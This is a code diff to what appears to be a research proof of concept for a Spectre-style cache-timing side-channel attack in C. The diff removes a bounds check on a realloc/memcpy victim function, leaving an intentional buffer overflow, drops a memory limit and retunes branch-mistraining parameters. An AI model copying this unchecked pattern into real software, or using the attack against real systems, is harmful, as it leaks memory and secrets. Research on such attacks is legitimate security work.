@@ -12,7 +12,7 @@
 #include <x86intrin.h>
 #include <errno.h>
 #include <sys/resource.h>
-
+#include "mimalloc-main/include/mimalloc.h"
 
 #define PAGE_SIZE 4096
 #define NUM_PAGES 256
@@ -31,17 +31,6 @@ array_index_mask_nospec(unsigned long index, unsigned long size) {
 
 volatile uint32_t array_size = 8;
 
-
-void set_heap_limit(size_t limit_bytes) {
-    struct rlimit rl;
-    rl.rlim_cur = limit_bytes;
-    rl.rlim_max = limit_bytes;
-
-    if (setrlimit(RLIMIT_AS, &rl) != 0) {
-        perror("setrlimit failed");
-        exit(1);
-    }
-}
 
 char* secret_init(){
     char* array = malloc(16);
@@ -84,7 +73,7 @@ char random_char(){
 
 
 #define REP 100 // Number of repetitions to de-noise the channel
-#define TRAINING_EPOCH 32 // 15 in-bound accesses then 1 out-of-bound access
+#define TRAINING_EPOCH 64 // 15 in-bound accesses then 1 out-of-bound access
 #define BUF_SIZE 1
 
 
@@ -163,14 +152,16 @@ uint64_t calibrate_latency() {
 }
 
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
-    if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
-        uint8_t *old_array = *array;
-        *array = realloc(*array, new_size);
-        memcpy(*array, old_array, array_size); // move the old content
-    }
-    // uint8_t *old_array = *array;
-    // *array = realloc(*array, new_size);
-    // memcpy(*array, old_array, array_size); // move the old content
+    // if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
+    //     uint8_t* old_array = *array;
+    //     *array = realloc(*array, new_size);
+    //     memcpy(*array, old_array, array_size); // move the old content
+    // }
+
+    uint8_t* old_array = *array;
+    *array = realloc(*array, new_size);
+    memcpy(*array, old_array, array_size); // move the old content
+
     index &= array_index_mask_nospec(index, new_size);
     uint8_t secret = (*array)[index];
     _maccess(page + secret * stride);
@@ -280,7 +271,6 @@ void attacker_function() {
 
 
 int main (){
-    set_heap_limit(100 * 1024 * 1024);
     attacker_function();
     return 0;
 }
